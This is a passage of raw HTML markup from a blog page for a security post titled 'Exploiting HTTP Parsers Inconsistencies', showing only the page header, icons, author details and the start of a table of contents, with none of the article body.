9.62177V6.76303H18.3913V9.62177H19.8913ZM19.8913 6.76303V3.9043H18.3913V6.76303H19.8913ZM7.93282 14.4475C8.80209 14.8966 9.38471 15.2078 10.0103 15.307L10.2451 13.8255C9.91517 13.7732 9.58255 13.6115 8.62134 13.1149L7.93282 14.4475ZM12.7297 12.8847C11.8299 13.4856 11.5175 13.6834 11.1955 13.7722L11.5943 15.2182C12.2049 15.0498 12.7491 14.6755 13.5627 14.1321L12.7297 12.8847ZM10.0103 15.307C10.5386 15.3907 11.0786 15.3604 11.5943 15.2182L11.1955 13.7722C10.8861 13.8575 10.562 13.8757 10.2451 13.8255L10.0103 15.307Z"></path></svg></button></div><div class="h-10 w-10 rounded-full"><button type="button" aria-label="Toggle sign-up options" class="focus-ring-base flex flex-row items-center rounded-full font-medium transition duration-100 ease-in-out focus-ring-colors-dark-header hover:bg-white/20 blog-more-icon p-2" id="radix-:ri:" aria-haspopup="menu" aria-expanded="false" data-state="closed"><svg class="h-6 w-6 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6 9L12 15L18 9" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></div></div></div><div class="mx-auto my-5 flex w-2/3 flex-row items-center justify-center md:hidden"><h1 class="blog-title text-2xl text-center break-words font-heading font-semibold leading-snug md:font-bold text-white"><a href="https://rafa.hashnode.dev/?source=top_nav_blog_home" class="focus-ring-base flex flex-row items-center focus-ring-colors-dark-header" aria-label="Rafa&#39;s Blog home page">Rafa's Blog</a></h1></div><div class="blog-sub-header mb-4 md:hidden" data-testid="blog-sub-header"><div class="md:(mb-0 ml-auto) flex flex-row items-center justify-center gap-x-3"><button type="button" class="blog-follow-button focus-ring-base flex flex-row items-center rounded-full border-1-1/2 px-4 py-2 text-center text-sm font-medium transition-colors duration-150 hover:bg-opacity-90 disabled:cursor-not-allowed disabled:opacity-50 text-slate-800 bg-white border-white hover:bg-blue-50 focus-ring-colors-dark-header" aria-label="Follow user" data-state="closed"><svg class="mr-2 h-5 w-5 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2.5 19.25C2.5 15.5221 5.52208 12.5 9.25 12.5V12.5C12.9779 12.5 16 15.5221 16 19.25V19.5C16 20.6046 15.1046 21.5 14 21.5H4.5C3.39543 21.5 2.5 20.6046 2.5 19.5V19.25Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.75 6C12.75 7.933 11.183 9.5 9.25 9.5C7.317 9.5 5.75 7.933 5.75 6C5.75 4.067 7.317 2.5 9.25 2.5C11.183 2.5 12.75 4.067 12.75 6Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M19 7.5V10.5M19 10.5V13.5M19 10.5H16M19 10.5H22" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg><span>Follow</span></button><button class="blog-newsletter-button rounded-full border-1-1/2 bg-transparent p-2 transition-colors duration-150 focus-ring-base border-white text-white hover:bg-black/10 dark:border-white dark:text-white dark:hover:bg-black/10 focus-ring-colors-dark-header" type="button" aria-label="Open subscribe to newsletter" data-state="closed"><svg class="h-5 w-5 fill-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13.1367 7.50493C13.551 7.50493 13.8867 7.16914 13.8867 6.75493C13.8867 6.34071 13.551 6.00493 13.1367 6.00493V7.50493ZM19.9024 13.0846C19.9024 12.6704 19.5666 12.3346 19.1524 12.3346C18.7382 12.3346 18.4024 12.6704 18.4024 13.0846H19.9024ZM2.5013 9.95291C2.1333 9.76278 1.68084 9.90697 1.49071 10.275C1.30058 10.643 1.44477 11.0954 1.81277 11.2855L2.5013 9.95291ZM16.5938 12.1078C16.9382 11.8778 17.031 11.412 16.8009 11.0676C16.5709 10.7231 16.1051 10.6304 15.7607 10.8604L16.5938 12.1078ZM16.2825 6.01303C15.8683 6.01303 15.5325 6.34882 15.5325 6.76303C15.5325 7.17725 15.8683 7.51303 16.2825 7.51303V6.01303ZM22 7.51303C22.4142 7.51303 22.75 7.17725 22.75 6.76303C22.75 6.34882 22.4142 6.01303 22 6.01303V7.51303ZM18.3913 9.62177C18.3913 10.036 18.727 10.3718 19.1413 10.3718C19.5555 10.3718 19.8913 10.036 19.8913 9.62177H18.3913ZM19.8913 3.9043C19.8913 3.49008 19.5555 3.1543 19.1413 3.1543C18.727 3.1543 18.3913 3.49008 18.3913 3.9043H19.8913ZM8.27708 13.7812L7.93282 14.4475L8.27708 13.7812ZM10.1277 14.5662L10.0103 15.307L10.1277 14.5662ZM11.3949 14.4952L11.1955 13.7722L11.3949 14.4952ZM18.4024 18.1899C18.4024 18.8282 17.8849 19.3457 17.2466 19.3457V20.8457C18.7134 20.8457 19.9024 19.6566 19.9024 18.1899H18.4024ZM17.2466 19.3457H3.90583V20.8457H17.2466V19.3457ZM3.90583 19.3457C3.26748 19.3457 2.75 18.8282 2.75 18.1899H1.25C1.25 19.6566 2.43905 20.8457 3.90583 20.8457V19.3457ZM2.75 18.1899V8.66075H1.25V18.1899H2.75ZM2.75 8.66075C2.75 8.02241 3.26748 7.50493 3.90583 7.50493V6.00493C2.43905 6.00493 1.25 7.19398 1.25 8.66075H2.75ZM3.90583 7.50493H13.1367V6.00493H3.90583V7.50493ZM19.9024 18.1899V13.0846H18.4024V18.1899H19.9024ZM1.81277 11.2855L7.93282 14.4475L8.62134 13.1149L2.5013 9.95291L1.81277 11.2855ZM13.5627 14.1321L16.5938 12.1078L15.7607 10.8604L12.7297 12.8847L13.5627 14.1321ZM16.2825 7.51303H19.1413V6.01303H16.2825V7.51303ZM19.1413 7.51303H22V6.01303H19.1413V7.51303ZM19.8913 9.62177V6.76303H18.3913V9.62177H19.8913ZM19.8913 6.76303V3.9043H18.3913V6.76303H19.8913ZM7.93282 14.4475C8.80209 14.8966 9.38471 15.2078 10.0103 15.307L10.2451 13.8255C9.91517 13.7732 9.58255 13.6115 8.62134 13.1149L7.93282 14.4475ZM12.7297 12.8847C11.8299 13.4856 11.5175 13.6834 11.1955 13.7722L11.5943 15.2182C12.2049 15.0498 12.7491 14.6755 13.5627 14.1321L12.7297 12.8847ZM10.0103 15.307C10.5386 15.3907 11.0786 15.3604 11.5943 15.2182L11.1955 13.7722C10.8861 13.8575 10.562 13.8757 10.2451 13.8255L10.0103 15.307Z"></path></svg></button></div><div class="mt-6"><div class="blog-social-media-section flex flex-row flex-wrap gap-y-2 justify-center gap-x-1.5 text-white"><a href="https://twitter.com/rafabyte_" aria-label="Find me on Twitter, external website, opens in new tab" target="_blank" rel="me noopener" class="focus-ring-base flex flex-row items-center justify-center rounded-full p-2 transition-colors duration-150 focus-ring-colors-dark-header hover:bg-white/20"><svg class="h-5 w-5 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.643 13.346L4.26862 4.86856C3.85863 4.32329 4.2478 3.54408 4.93001 3.54431L7.2184 3.54508C7.47633 3.54517 7.71945 3.66557 7.87585 3.87066L12.9065 10.4675M10.643 13.346L5.19311 20.5093M10.643 13.346L15.8028 20.077C15.9588 20.2805 16.2003 20.4001 16.4567 20.4009L18.7925 20.4082C19.4778 20.4104 19.8683 19.6261 19.4536 19.0805L12.9065 10.4675M12.9065 10.4675L18.2181 3.50928" stroke-width="1.5" stroke-linecap="round"></path></svg></a><a href="https://github.com/rafax00" aria-label="Find me on Github, opens in new tab" target="_blank" rel="me noopener" class="focus-ring-base flex flex-row items-center justify-center rounded-full p-2 transition-colors duration-150 focus-ring-colors-dark-header hover:bg-white/20"><svg class="h-5 w-5 fill-current" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://hashnode.com/@rafax00" aria-label="Find me on Hashnode, external website, opens in new tab" target="_blank" rel="me noopener" class="focus-ring-base flex flex-row items-center justify-center rounded-full p-2 transition-colors duration-150 focus-ring-colors-dark-header hover:bg-white/20"><svg class="h-5 w-5 fill-current" viewBox="0 0 200 200" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.742 66.824c-18.323 18.323-18.323 48.029 0 66.352l53.082 53.082c18.323 18.323 48.029 18.323 66.352 0l53.082-53.082c18.323-18.323 18.323-48.03 0-66.352l-53.082-53.082c-18.323-18.323-48.03-18.323-66.352 0L13.742 66.824zm109.481 56.399c12.826-12.826 12.826-33.62 0-46.446s-33.62-12.826-46.446 0-12.826 33.62 0 46.446 33.62 12.826 46.446 0z"></path></svg></a><a href="https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/" aria-label="Find me on LinkedIn, external website, opens in new tab" target="_blank" rel="me noopener" class="focus-ring-base flex flex-row items-center justify-center rounded-full p-2 transition-colors duration-150 focus-ring-colors-dark-header hover:bg-white/20"><svg class="h-5 w-5 fill-current" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg></a><a href="https://rafa.hashnode.dev/rss.xml" aria-label="Open blog XML Feed, opens in new tab" target="_blank" rel="me noopener" class="focus-ring-base flex flex-row items-center justify-center rounded-full p-2 transition-colors duration-150 focus-ring-colors-dark-header hover:bg-white/20"><svg class="h-5 w-5 fill-current" viewBox="0 0 448 512"><path d="M80 368c17.645 0 32 14.355 32 32s-14.355 32-32 32-32-14.355-32-32 14.355-32 32-32m0-48c-44.183 0-80 35.817-80 80s35.817 80 80 80 80-35.817 80-80-35.817-80-80-80zm367.996 147.615c-6.449-237.834-198.057-429.163-435.61-435.61C5.609 31.821 0 37.229 0 44.007v24.02c0 6.482 5.147 11.808 11.626 11.992 211.976 6.04 382.316 176.735 388.354 388.354.185 6.479 5.51 11.626 11.992 11.626h24.02c6.78.001 12.187-5.608 12.004-12.384zm-136.239-.05C305.401 305.01 174.966 174.599 12.435 168.243 5.643 167.977 0 173.444 0 180.242v24.024c0 6.431 5.072 11.705 11.497 11.98 136.768 5.847 246.411 115.511 252.258 252.258.275 6.425 5.549 11.497 11.98 11.497h24.024c6.797-.001 12.264-5.644 11.998-12.436z"></path></svg></a></div></div></div></div></header><div class="blog-post-area relative z-40"><main class="blog-post-detail-card pb-24"><article><div class="blog-article-page container relative mx-auto grid grid-cols-8"><div class="col-span-full lg:col-span-6 lg:col-start-2"><div class="mt-6 break-words px-4 text-center font-heading text-3xl font-extrabold text-slate-900 dark:text-white md:mt-10 md:px-5 md:text-4xl lg:px-8 xl:px-20 xl:text-5xl mb-5"><h1 class="leading-snug" data-query="post-title">Exploiting HTTP Parsers Inconsistencies</h1></div><div class="mb-8 px-4 text-center font-heading md:mb-14 md:px-5 lg:px-8 xl:px-20"><h2 class="text-2xl leading-snug text-slate-700 dark:text-slate-400 md:text-3xl xl:text-3xl">Unveiling Vulnerabilities in HTTP Parsers: Exploiting Inconsistencies for Security Breaches</h2></div><div class="relative z-20 mb-8 flex flex-row flex-wrap items-center justify-center px-4 md:-mt-7 md:mb-14 md:text-lg last:md:mb-10"><div class="mb-5 flex w-full flex-row items-center justify-center md:mb-0 md:w-auto md:justify-start"><div class="overflow-hidden rounded-full  bg-slate-200  dark:bg-white/20 md:mr-3 h-10 w-10 md:h-12 md:w-12" style="z-index: 1;"><a href="https://hashnode.com/@rafax00" class="relative block h-full w-full"><span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27200%27%20height=%27200%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span><img alt="Rafael da Costa Santos&#39;s photo" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/qxI_lhzL_(1).gif" decoding="async" data-nimg="intrinsic" class="relative z-20 block w-full rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span></a></div><a href="https://hashnode.com/@rafax00" class="ml-2 font-semibold text-slate-600 dark:text-white md:ml-0"><span>Rafael da Costa Santos</span></a></div><div class="mb-5 flex w-full flex-row items-center justify-center md:mb-0 md:w-auto md:justify-start"><span class="mx-3 hidden font-bold text-slate-500 md:block">·</span><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies" class="tooltip-handle text-slate-600 dark:text-slate-400" data-title="Jun 18, 2023 01:25"><time datetime="2023-06-17T17:25:25.280Z">Jun 18, 2023</time></a></div></div><div class="-mt-7 mb-8 flex flex-col items-center md:mb-14 md:flex-row md:justify-center"><div class="mb-2 flex flex-row items-center overflow-hidden rounded-full bg-indigo-100 px-2 text-sm font-semibold leading-snug text-indigo-700 hover:shadow dark:bg-indigo-900 dark:text-white md:mb-0 md:mr-2"><div class="p-1"><svg class="h-8 w-8 fill-current" viewBox="0 0 1200 1200"><defs><style>.cls-1{fill:#fff;}.cls-2{fill:#f67171;}.cls-3{fill:#3c81f4;}.cls-4{fill:#da2626;}.cls-5{fill:#f7f8f9;}.cls-6{fill:#f8ca15;}.cls-7{fill:#4338c8;}.cls-8{fill:#333;}</style></defs><path class="cls-1" d="M1057.32,824.26,867.2,613.68l10.26-10.25a172.73,172.73,0,0,0,0-244.31L722.16,203.81a172.8,172.8,0,0,0-244.35,0l-44,44-13-59.3a35.49,35.49,0,0,0-69.34,0l-19.93,91-71.76,18.12a35.49,35.49,0,0,0,0,68.82l46.28,11.7a172.69,172.69,0,0,0,16.46,225.24l10.26,10.25L142.67,824.28a35.49,35.49,0,0,0,23.1,59.13l125,11.44,24.1,123.26A35.49,35.49,0,0,0,376.12,1035L580.94,808.23a168.82,168.82,0,0,0,38.13,0l204.85,226.86a35.5,35.5,0,0,0,61.18-17l24.07-123.27,125.06-11.44a35.49,35.49,0,0,0,23.09-59.15Z"></path><polygon class="cls-2" points="818.26 612.43 1030.99 848.07 879.43 861.92 732.03 698.66 818.26 612.43"></polygon><path class="cls-3" d="M892.24,471.48l-1.3.07a136.56,136.56,0,0,1-38.58,75.92l-34.1,34.1L732,667.8l-35,35a137.28,137.28,0,0,1-194.15,0l-35-35-86.2-86.23-34.1-34.1a136.56,136.56,0,0,1-38.58-75.92l-1.3-.07a137.11,137.11,0,0,1,39.88-87.28l16.57-16.54,21.94,100.43L410.81,355.6l93.11-23.52-83.2-21,82.19-82.19a137.31,137.31,0,0,1,194.15,0l155.3,155.3A137.11,137.11,0,0,1,892.24,471.48ZM667.93,549.2a96.09,96.09,0,1,0-135.89,0A96.08,96.08,0,0,0,667.93,549.2Z"></path><polygon class="cls-4" points="732.03 698.66 879.43 861.92 872.61 896.89 716.66 714.03 732.03 698.66"></polygon><path class="cls-2" d="M716.66,714l156,182.86L850.26,1011.3,632.34,770a136.51,136.51,0,0,0,64.72-36.36Z"></path><ellipse class="cls-5" cx="599.98" cy="481.25" rx="96.08" ry="96.1"></ellipse><path class="cls-2" d="M502.91,733.63A136.56,136.56,0,0,0,567.66,770L349.74,1011.3,326.46,892.23h0L482.17,712.89Z"></path><polygon class="cls-6" points="503.92 332.08 410.81 355.6 386.15 468.09 364.21 367.66 361.52 355.6 268.47 332.08 361.52 308.59 386.15 196.1 410.81 308.59 420.72 311.09 503.92 332.08"></polygon><polygon class="cls-4" points="482.17 712.89 326.5 892.23 326.46 892.23 320.54 861.92 467.94 698.66 482.17 712.89"></polygon><polygon class="cls-2" points="381.74 612.43 467.94 698.66 320.54 861.92 169 848.07 381.74 612.43"></polygon><path class="cls-7" d="M852.36,547.47a136.56,136.56,0,0,0,38.58-75.92l1.3-.07a137,137,0,0,1-39.88,106.85l-34.1,34.1L732,698.66,716.66,714l-19.6,19.6A136.51,136.51,0,0,1,632.34,770a138.1,138.1,0,0,1-64.68,0,136.56,136.56,0,0,1-64.75-36.36L482.2,712.89h0v0l-14.23-14.2-86.2-86.23-34.1-34.1a137,137,0,0,1-39.88-106.85l1.3.07a136.56,136.56,0,0,0,38.58,75.92l34.1,34.1,86.2,86.23,35,35a137.27,137.27,0,0,0,194.15,0l35-35,86.23-86.23Z"></path><path class="cls-8" d="M818.26,617.06a4.63,4.63,0,0,1-3.28-7.9l34.11-34.1a132.61,132.61,0,0,0,0-187.59L693.79,232.18a132.67,132.67,0,0,0-187.61,0L424,314.37a4.63,4.63,0,0,1-6.54-6.55l82.18-82.19a141.93,141.93,0,0,1,200.7,0l155.31,155.3a141.87,141.87,0,0,1,0,200.67l-34.11,34.11A4.62,4.62,0,0,1,818.26,617.06Z"></path><path class="cls-8" d="M600,778.44a142.69,142.69,0,0,1-33.44-4,4.63,4.63,0,0,1,2.17-9,133.73,133.73,0,0,0,62.52,0,4.63,4.63,0,0,1,2.17,9A142.46,142.46,0,0,1,600,778.44Z"></path><path class="cls-8" d="M502.91,738.26a4.59,4.59,0,0,1-3.28-1.36l-20.56-20.59a4.62,4.62,0,0,1,3.1-8h0a4.62,4.62,0,0,1,3.27,1.36l20.71,20.74a4.63,4.63,0,0,1-3.27,7.9Z"></path><path class="cls-8" d="M482.17,717.49a4.6,4.6,0,0,1-3.27-1.35l-14.23-14.2a4.63,4.63,0,1,1,6.54-6.55l14.23,14.19a4.64,4.64,0,0,1,0,6.55A4.59,4.59,0,0,1,482.17,717.49Z"></path><path class="cls-8" d="M381.74,617.06a4.62,4.62,0,0,1-3.27-1.35L344.36,581.6a141.87,141.87,0,0,1,0-200.67l16.58-16.54a4.63,4.63,0,1,1,6.54,6.55l-16.57,16.54a132.6,132.6,0,0,0,0,187.58l34.1,34.1a4.63,4.63,0,0,1-3.27,7.9Z"></path><path class="cls-8" d="M600,582a100.72,100.72,0,1,1,71.2-29.5h0A100,100,0,0,1,600,582Zm0-192.18a91.46,91.46,0,1,0,64.65,156.13h0A91.46,91.46,0,0,0,600,389.79Z"></path><path class="cls-8" d="M320.55,866.55h-.43L168.58,852.68a4.63,4.63,0,0,1-3-7.72L378.3,609.33a4.62,4.62,0,0,1,3.32-1.52,4.26,4.26,0,0,1,3.39,1.35l86.2,86.23a4.63,4.63,0,0,1-6.55,6.55l-82.75-82.79L178.64,844.3l142.32,13a4.63,4.63,0,0,1-.41,9.24Z"></path><path class="cls-8" d="M349.74,1015.93a4.75,4.75,0,0,1-1.24-.17,4.64,4.64,0,0,1-3.31-3.57L316,862.81a4.64,4.64,0,0,1,1.1-4L464.5,695.56a4.62,4.62,0,0,1,3.32-1.52,4.44,4.44,0,0,1,3.39,1.35l35,35a132.23,132.23,0,0,0,62.56,35.12,4.63,4.63,0,0,1,2.35,7.61L353.17,1014.4A4.61,4.61,0,0,1,349.74,1015.93ZM325.53,863.31l27,138L559.16,772.49a141.62,141.62,0,0,1-59.53-35.59l-31.52-31.52Z"></path><path class="cls-8" d="M879.42,866.55a4.63,4.63,0,0,1-.41-9.24l142.35-13L818.09,619.15,735.3,701.94a4.63,4.63,0,0,1-6.54-6.55L815,609.16a4.38,4.38,0,0,1,3.39-1.35,4.62,4.62,0,0,1,3.32,1.52L1034.43,845a4.63,4.63,0,0,1-3,7.72L879.85,866.54Z"></path><path class="cls-8" d="M850.26,1015.93a4.61,4.61,0,0,1-3.43-1.53L628.91,773.09a4.63,4.63,0,0,1,2.35-7.61,132.24,132.24,0,0,0,62.53-35.12l35-35a4.43,4.43,0,0,1,3.39-1.35,4.6,4.6,0,0,1,3.31,1.52l147.4,163.26a4.62,4.62,0,0,1,1.11,4l-29.16,149.38a4.64,4.64,0,0,1-3.31,3.57A4.81,4.81,0,0,1,850.26,1015.93ZM640.84,772.48l206.65,228.85,27-138L731.86,705.38,700.33,736.9A141.48,141.48,0,0,1,640.84,772.48Z"></path><path class="cls-8" d="M386.15,472.72h0a4.63,4.63,0,0,1-4.52-3.64l-24-109.7-90.29-22.81a4.63,4.63,0,0,1,0-9l90.28-22.79,24-109.69a4.63,4.63,0,0,1,9,0l24.05,109.7,90.34,22.79a4.63,4.63,0,0,1,0,9l-90.34,22.81-24.05,109.7A4.61,4.61,0,0,1,386.15,472.72ZM287.38,332.08l75.28,19a4.61,4.61,0,0,1,3.38,3.48l2.69,12.07,17.43,79.78,20.13-91.84a4.62,4.62,0,0,1,3.39-3.49l75.33-19-65.42-16.5h0l-9.91-2.5a4.63,4.63,0,0,1-3.39-3.5l-20.13-91.85-20.11,91.85a4.65,4.65,0,0,1-3.39,3.5Z"></path></svg></div><div class="p-2">Featured on Hashnode</div></div><button type="button" class="group mb-2 ml-0 mt-4 flex flex-row items-center overflow-hidden rounded-full bg-slate-100 pl-2 pr-1 text-sm font-semibold leading-snug text-slate-600 hover:bg-slate-200 dark:bg-slate-800 dark:text-slate-200 hover:dark:bg-slate-700 md:mb-0 md:ml-4 md:mt-0" data-state="closed"><div class="mr-3 p-2"><svg class="h-6 w-6 stroke-current" fill="none" viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg"><path d="M14.3083 8.97852C14.9383 7.44645 15.2408 5.7389 14.7557 4.08374C14.0577 1.70199 11.5262 0.6286 9.47593 1.19739C8.45082 1.48178 7.53408 2.13598 7.15271 3.35617C6.17303 2.53487 5.03486 2.49894 4.03173 2.79293C1.99015 3.39126 0.447158 5.69084 1.14518 8.07259C1.89721 10.6386 4.31075 12.2888 6.48391 13.2341M14.3083 8.97852C14.0084 8.57633 13.6208 8.25477 13.2004 8.00413C11.373 6.91481 8.63784 7.34826 7.367 9.48015C6.67907 10.6342 6.44594 11.9384 6.48391 13.2341M14.3083 8.97852C14.6489 9.43523 14.8764 9.99591 14.9107 10.6748C16.0645 10.1243 17.1676 10.3511 18.0735 10.909C19.8851 12.0248 20.8205 14.6105 19.5497 16.7423C17.008 21.0062 9.71032 20.7837 9.10119 20.4206C8.65692 20.1558 6.5862 16.7257 6.48391 13.2341" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></div><div class="relative h-8 w-8 rounded-full border-1-1/2 border-slate-100 bg-white group-hover:border-slate-200 dark:border-slate-800 dark:bg-slate-600 group-hover:dark:border-slate-700 [&amp;:not(:first-of-type)]:-ml-3" style="z-index: 1;"><img data-sizes="auto" loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/7PiSieMPM.png" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1677354149133/7PiSieMPM.png?w=200&amp;h=200&amp;fit=crop&amp;crop=faces&amp;auto=compress,format&amp;format=webp" width="200" height="200" alt="Daniela Passos&#39;s photo" class="lazyload block mr-3 h-full w-full rounded-full"></div><div class="relative h-8 w-8 rounded-full border-1-1/2 border-slate-100 bg-white group-hover:border-slate-200 dark:border-slate-800 dark:bg-slate-600 group-hover:dark:border-slate-700 [&amp;:not(:first-of-type)]:-ml-3" style="z-index: 2;"><img data-sizes="auto" loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/GSGNIBLBq.jpeg" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1655937669552/GSGNIBLBq.jpeg?w=200&amp;h=200&amp;fit=crop&amp;crop=faces&amp;auto=compress,format&amp;format=webp" width="200" height="200" alt="Salawu Ahmed&#39;s photo" class="lazyload block mr-3 h-full w-full rounded-full"></div><div class="relative h-8 w-8 rounded-full border-1-1/2 border-slate-100 bg-white group-hover:border-slate-200 dark:border-slate-800 dark:bg-slate-600 group-hover:dark:border-slate-700 [&amp;:not(:first-of-type)]:-ml-3" style="z-index: 3;"><img data-sizes="auto" loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/1a9ce797-a924-4ecf-bdfc-08cf1caa8365.jpeg" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1697752889550/1a9ce797-a924-4ecf-bdfc-08cf1caa8365.jpeg?w=200&amp;h=200&amp;fit=crop&amp;crop=faces&amp;auto=compress,format&amp;format=webp" width="200" height="200" alt="0xrz&#39;s photo" class="lazyload block mr-3 h-full w-full rounded-full"></div><div class="relative h-8 w-8 rounded-full border-1-1/2 border-slate-100 bg-white group-hover:border-slate-200 dark:border-slate-800 dark:bg-slate-600 group-hover:dark:border-slate-700 [&amp;:not(:first-of-type)]:-ml-3" style="z-index: 4;"><img data-sizes="auto" loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/8b5-nKHIi.png" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1695185814816/8b5-nKHIi.png?w=200&amp;h=200&amp;fit=crop&amp;crop=faces&amp;auto=compress,format&amp;format=webp" width="200" height="200" alt="Tô Đỉnh Nguyên&#39;s photo" class="lazyload block mr-3 h-full w-full rounded-full"></div><div class="relative -ml-3 flex h-8 items-center justify-center overflow-hidden rounded-full border-1-1/2 border-slate-100 bg-white px-1 group-hover:border-slate-200 dark:border-slate-800 dark:bg-slate-600 group-hover:dark:border-slate-700" style="z-index: 4; min-width: 2rem;"><p class="truncate text-xs font-normal">+23</p></div></button></div><div class="relative my-8 md:my-14"><span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 52.5% 0px 0px;"></span><img alt="Exploiting HTTP Parsers Inconsistencies" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png" decoding="async" data-nimg="responsive" class="mb-0 block w-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"><noscript></noscript></span></div></div></div><div class="blog-content-wrapper article-main-wrapper container relative z-30 mx-auto grid grid-flow-row grid-cols-8 xl:gap-6 2xl:grid-cols-10"><section class="blog-content-main z-20 col-span-8 mb-10 px-4 md:z-10 lg:col-span-6 lg:col-start-2 lg:px-0 xl:col-span-6 xl:col-start-2 2xl:col-span-6 2xl:col-start-3"><div class="relative"><div class="relative w-full overflow-hidden rounded-xl border border-slate-200 bg-white dark:border-slate-800 dark:bg-slate-900 mx-auto mb-10 max-w-[812px]"><div class="pointer-events-none absolute inset-0 bg-[linear-gradient(180deg,_#ffffff00_65.93%,_#ffffff_86%)] dark:bg-[linear-gradient(180deg,_#10182b00_65.93%,_#10182B_86%)]"></div><div class="pr-4 max-h-[400px] overflow-hidden"><h2 class="px-6 py-5 pb-4 text-lg font-semibold text-slate-800 dark:text-slate-100"><span>Table of contents</span></h2><ul class="pl-4 dark:border-slate-800"><li><a 